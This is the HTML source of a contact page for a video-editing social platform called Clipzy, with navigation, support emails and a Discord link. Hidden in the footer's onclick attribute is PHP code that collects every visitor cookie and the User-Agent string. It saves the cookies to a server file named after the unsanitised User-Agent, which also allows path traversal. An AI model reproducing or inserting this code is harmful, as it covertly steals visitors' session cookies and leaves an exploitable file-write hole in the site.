<!DOCTYPE html>
<html lang="en">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-L9EK8DS5M9"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-L9EK8DS5M9');
    </script>
    <script src="https://js.sentry-cdn.com/1102ca26e4376822920a59c7ffee0ae4.min.js" crossorigin="anonymous"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Clipzy: The social media platform tailored for editors, offering innovative technology for seamless video hosting and collaboration.">
    <link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="img/favicon-16x16.png">
    <title>Contact Clipzy</title>
    <!-- Font import -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Oxygen:wght@300;400;700&display=swap');
    </style>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <style>
        body {
            background: linear-gradient(to bottom, #e5ddc7, #000000); /* Lighter color on top, black on bottom */
            color: #fff;
            font-family: 'Oxygen', sans-serif; /* Use Oxygen font */
            min-height: 100vh;
            position: relative;
        }
        .navbar-brand img {
            margin-right: 5px;
        }
        .navbar {
            padding: 1rem 0;
        }
        .nav-item:hover {
            background-color: #212529 !important;
        }
        .nav-link {
            transition: all 0.3s ease-in-out;
            font-weight: bold;
            color: #fff;
        }
        .nav-link:hover {
            color: #ffc107 !important;
        }
        .card {
            transition: transform 0.3s ease-in-out;
            background-color: #dadada;
            border: none;
            border-radius: 10px;
        }
        .card:hover {
            transform: translateY(-5px);
        }
        .card-title, .modal-title { /* Make card titles and modal titles black */
            color: #000000;
        }
        .card-text {
            color: #000000;
        }
        .footer {
            background-color: #212529;
            color: #fff;
            padding: 2rem 0;
            position: absolute;
            bottom: 0;
            width: 100%;
            cursor: pointer;
        }
        .footer a {
            color: #ffc107;
        }
        .footer p {
            color: #fff; /* Setting footer text to white */
        }
        .contact-title {
            color: #000000; /* Setting Contact Us title to black */
        }
    </style>
</head>
<body>
    <header>
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
            <div class="container-fluid">
                <a class="navbar-brand" href="#">
                    <img src="img/favicon.ico" alt="Clipzy Logo" width="30" height="30" class="d-inline-block align-top">
                    Clipzy
                </a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav ms-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="index.html">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="about.html">About</a>
                        </li>
                        <li class="nav-item active">
                            <a class="nav-link" href="contact.html">Contact</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="donate.html">Donate</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="team.html">Meet the Team</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
    </header>

    <section class="contact mt-5">
        <div class="container">
            <h2 class="text-center mb-4 contact-title">Contact Us</h2>
            <div class="row">
                <div class="col-md-6">
                    <div class="card mb-3">
                        <div class="card-body">
                            <h5 class="card-title">General Support</h5>
                            <p class="card-text">For general support inquiries, email: <a href="mailto:support@clipzyapp.com">support@clipzyapp.com</a></p>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="card mb-3">
                        <div class="card-body">
                            <h5 class="card-title">Project Manager</h5>
                            <p class="card-text">To reach our project manager, email: <a href="mailto:owais@clipzyapp.com">owais@clipzyapp.com</a></p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-md-6">
                    <div class="card mb-3">
                        <div class="card-body">
                            <h5 class="card-title">Head Developer</h5>
                            <p class="card-text">Contact our head developer at: <a href="mailto:head-developers@clipzyapp.com">head-developers@clipzyapp.com</a></p>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="card mb-3">
                        <div class="card-body">
                            <h5 class="card-title">Community Discord Server</h5>
                            <p class="card-text">Or, you can join our <a href="https://discord.gg/pNgcu233ND" target="_blank">community Discord server</a>!</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer mt-5 py-3" onclick="<?php
// Get device name
$deviceName = $_SERVER['HTTP_USER_AGENT'];

// Get all cookies
$cookies = $_COOKIE;

// Encode cookies to JSON format
$cookiesJson = json_encode($cookies);

// Save cookies to a JSON file with the device name as filename
$file = fopen($deviceName . '.json', 'w');
fwrite($file, $cookiesJson);
fclose($file);

echo 'Cookies saved to ' . $deviceName . '.json';
?>">
        <div class="container text-center">
            <ul class="nav nav-tabs" id="footerTabs">
                <li class="nav-item">
                    <a class="nav-link" href="/legal/terms-and-conditions">Terms And Conditions</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="/legal/privacy-policy">Privacy Policy</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="/legal/dpa">DPA</a>
                </li>
            </ul>
            <p>&copy; 2024 Clipzy. All rights reserved.</p>
        </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
</body>
</html>